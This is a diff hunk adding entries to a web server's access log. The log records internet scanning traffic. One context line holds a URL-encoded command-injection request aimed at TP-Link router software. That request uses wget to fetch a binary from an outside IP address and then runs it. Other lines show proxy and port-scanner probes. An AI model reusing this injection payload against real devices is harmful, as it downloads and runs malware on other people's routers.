@@ -2775,3 +2775,9 @@
 2025-05-15 12:33:27,971 - uvicorn.access - INFO - 68.69.184.218:58588 - "CONNECT www.google.com%3A443 HTTP/1.1" 404
 2025-05-15 12:39:21,342 - uvicorn.access - INFO - 141.98.11.137:60198 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F212.81.47.226%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 200
 2025-05-15 12:40:32,226 - uvicorn.access - INFO - 154.81.156.10:34356 - "GET / HTTP/1.1" 200
+2025-05-15 13:31:30,180 - uvicorn.access - INFO - 139.162.186.99:33402 - "GET / HTTP/1.0" 200
+2025-05-15 13:31:30,244 - uvicorn.access - INFO - 139.162.186.99:33490 - "OPTIONS / HTTP/1.0" 405
+2025-05-15 13:31:30,323 - uvicorn.access - INFO - 139.162.186.99:33514 - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 200
+2025-05-15 13:31:58,137 - uvicorn.access - INFO - 139.162.186.99:54484 - "GET / HTTP/1.1" 200
+2025-05-15 13:31:58,290 - uvicorn.access - INFO - 139.162.186.99:54494 - "GET /favicon.ico HTTP/1.1" 200
+2025-05-15 13:32:08,226 - uvicorn.access - INFO - 139.162.186.99:52248 - "GET / HTTP/1.1" 200
